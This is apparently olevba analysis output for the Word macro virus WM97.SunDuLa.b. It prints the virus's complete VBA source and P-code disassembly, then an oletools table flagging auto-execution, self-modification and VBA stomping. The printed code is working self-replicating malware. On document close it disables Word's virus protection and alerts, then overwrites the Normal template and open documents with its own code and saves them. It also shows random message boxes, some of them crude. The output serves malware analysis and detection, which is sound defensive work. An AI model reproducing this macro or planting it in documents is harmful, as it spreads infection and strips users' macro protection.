olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Sundula.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Sundula.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'WM97.SunDuLa.b
Private Sub Document_Close()
 On Error Resume Next
 
 With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
        .ConfirmConversions = False
 End With

With Application
       .ScreenUpdating = False
       .DisplayStatusBar = False
       .DisplayAlerts = False
End With
 
 Set norm = NormalTemplate.VBProject.VBComponents(1).codemodule
 Set doc = ActiveDocument.VBProject.VBComponents(1).codemodule
    
    If norm.Lines(1, 1) <> "'WM97.SunDuLa.b" Then
        norm.DeleteLines 1, norm.CountOfLines
        norm.InsertLines 1, doc.Lines(1, doc.CountOfLines)
        norm.replaceline 71, "Sub ViewVBcode()"
        ElseIf doc.Lines(1, 1) <> "'WM97.SunDuLa.b" Then
        doc.DeleteLines 1, doc.CountOfLines
        doc.InsertLines 1, norm.Lines(1, norm.CountOfLines)
        doc.replaceline 71, "Sub Toolsmacro()"
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If

Randomize
If Int(Rnd * 12) = 2 Then
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False
Dim RandomNumber As Integer
RandomNumber = Int((Val(14) * Rnd) + 1)
Select Case RandomNumber
Case 1
MsgBox "Squirrels have fluffy tails!!", vbInformation, "Did you know?"
Case 2
MsgBox "Baboons have red butts!!", vbInformation, "Did you know?"
Case 3
MsgBox "Cows sleep standing up!!", vbInformation, "Did you know?"
Case 4
MsgBox "The average penis is 6 inchs long!!", vbInformation, "Did you know?"
Case 5
MsgBox "The average vagina is 9 inchs deep!!", vbInformation, "Did you know?"
Case 6
MsgBox "Flying squirrels don't fly they glide!!", vbInformation, "Did you know?"
Case 7
MsgBox "Life sucks!!", vbInformation, "Did you know?"
Case 8
MsgBox "Vampires are not real!!", vbInformation, "Did you know?"
Case 9
MsgBox "Werewolfs are not real!!", vbInformation, "Did you know?"
Case 10
MsgBox "The most dangerous wild animal is a deer!!", vbInformation, "Did you know"
Case 11
MsgBox "The platypus is the only mammal that lays eggs!!", vbInformation, "Did you know?"
Case 12
MsgBox "Flys live for about two days!!", vbInformation, "Did you know?"
Case 13
MsgBox "Turtles have shells!!", vbInformation, "Did you know?"
Case 14
MsgBox "Fish live in water!!", vbInformation, "Did you know?"
Case 15
MsgBox "You are infected with WM97.SunDuLa!!", vbInformation, "Did you know?"
End Select
End If
End Sub
Sub Toolsmacro()
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Sundula.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5300 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000E "WM97.SunDuLa.b"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #5:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #6:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #7:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #8:
' 	EndWith 
' Line #9:
' Line #10:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith DisplayStatusBar 
' Line #13:
' 	LitVarSpecial (False)
' 	MemStWith DisplayAlerts 
' Line #14:
' 	EndWith 
' Line #15:
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set norm 
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set doc 
' Line #18:
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld norm 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "'WM97.SunDuLa.b"
' 	Ne 
' 	IfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld norm 
' 	MemLd CountOfLines 
' 	Ld norm 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #21:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd CountOfLines 
' 	Ld doc 
' 	ArgsMemLd Lines 0x0002 
' 	Ld norm 
' 	ArgsMemCall InsertLines 0x0002 
' Line #22:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ViewVBcode()"
' 	Ld norm 
' 	ArgsMemCall replaceline 0x0002 
' Line #23:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "'WM97.SunDuLa.b"
' 	Ne 
' 	ElseIfBlock 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd CountOfLines 
' 	Ld doc 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #25:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld norm 
' 	MemLd CountOfLines 
' 	Ld norm 
' 	ArgsMemLd Lines 0x0002 
' 	Ld doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #26:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub Toolsmacro()"
' 	Ld doc 
' 	ArgsMemCall replaceline 0x0002 
' Line #27:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #28:
' 	EndIfBlock 
' Line #29:
' Line #30:
' 	ArgsCall Read 0x0000 
' Line #31:
' 	Ld Rnd 
' 	LitDI2 0x000C 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #32:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #33:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #34:
' 	Dim 
' 	VarDefn RandomNumber (As Integer)
' Line #35:
' 	LitDI2 0x000E 
' 	ArgsLd Val 0x0001 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RandomNumber 
' Line #36:
' 	Ld RandomNumber 
' 	SelectCase 
' Line #37:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #38:
' 	LitStr 0x001D "Squirrels have fluffy tails!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #39:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #40:
' 	LitStr 0x0018 "Baboons have red butts!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #41:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #42:
' 	LitStr 0x0018 "Cows sleep standing up!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #43:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #44:
' 	LitStr 0x0023 "The average penis is 6 inchs long!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #45:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #46:
' 	LitStr 0x0024 "The average vagina is 9 inchs deep!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #47:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #48:
' 	LitStr 0x0027 "Flying squirrels don't fly they glide!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #49:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' Line #50:
' 	LitStr 0x000C "Life sucks!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #51:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' Line #52:
' 	LitStr 0x0017 "Vampires are not real!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #53:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' Line #54:
' 	LitStr 0x0018 "Werewolfs are not real!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #55:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' Line #56:
' 	LitStr 0x002A "The most dangerous wild animal is a deer!!"
' 	Ld vbInformation 
' 	LitStr 0x000C "Did you know"
' 	ArgsCall MsgBox 0x0003 
' Line #57:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' Line #58:
' 	LitStr 0x0030 "The platypus is the only mammal that lays eggs!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #59:
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' Line #60:
' 	LitStr 0x001E "Flys live for about two days!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #61:
' 	LitDI2 0x000D 
' 	Case 
' 	CaseDone 
' Line #62:
' 	LitStr 0x0015 "Turtles have shells!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #63:
' 	LitDI2 0x000E 
' 	Case 
' 	CaseDone 
' Line #64:
' 	LitStr 0x0014 "Fish live in water!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #65:
' 	LitDI2 0x000F 
' 	Case 
' 	CaseDone 
' Line #66:
' 	LitStr 0x0024 "You are infected with WM97.SunDuLa!!"
' 	Ld vbInformation 
' 	LitStr 0x000D "Did you know?"
' 	ArgsCall MsgBox 0x0003 
' Line #67:
' 	EndSelect 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	EndSub 
' Line #70:
' 	FuncDefn (Sub Toolsmacro())
' Line #71:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

